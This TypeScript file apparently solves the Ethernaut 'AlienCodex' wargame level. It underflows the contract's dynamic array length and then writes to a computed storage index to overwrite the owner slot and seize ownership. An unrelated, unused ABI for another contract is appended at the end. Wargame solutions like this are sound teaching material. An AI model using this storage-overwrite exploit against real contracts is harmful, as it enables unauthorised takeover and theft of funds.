// Runtime Environment's members available in the global scope.
import { ethers } from 'ethers';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { AlienCodex__factory } from "../typechain";

async function main() {
  const instanceAddress = "0xc7aa6CFDFbDC5449b983666f2162013c6001e293";
  const signer = getSigner();

  const codex = await (AlienCodex__factory.connect(instanceAddress, signer)).deployed();
  const newOwnerAddress = await signer.getAddress();
  console.log("is contacted:", await codex.contact());
  await (await codex.make_contact()).wait();
  console.log("is contacted:", await codex.contact());

  console.log("run underflow function");
  await (await codex.retract()).wait();

  console.log("now have full access to storage. Now we edit underflow");
  const hash = ethers.utils.solidityKeccak256(["uint256"], [1]);
  const bn = ethers.constants.MaxUint256.sub(BigNumber.from(hash));
  console.log("current owner:", await codex.owner());
  // 0x000000000000000000000001 f39fd6e51aad88f6f4ce6ab8827279cfffb92266 Original storage for bool and address
  const data = "0x000000000000000000000001" + newOwnerAddress.substring(2);
  console.log(data);
  console.log(bn.add(1)._hex);
  await (await codex.revise(bn.add(1)._hex, data)).wait();

  console.log("new owner:", await codex.owner());
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [
      {
        "internalType": "bytes32[3]",
        "name": "_data",
        "type": "bytes32[3]"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ID",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xb3cea217"
  },
  {
    "inputs": [],
    "name": "locked",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xcf309012"
  },
  {
    "inputs": [
      {
        "internalType": "bytes16",
        "name": "_key",
        "type": "bytes16"
      }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xe1afb08c"
  }
]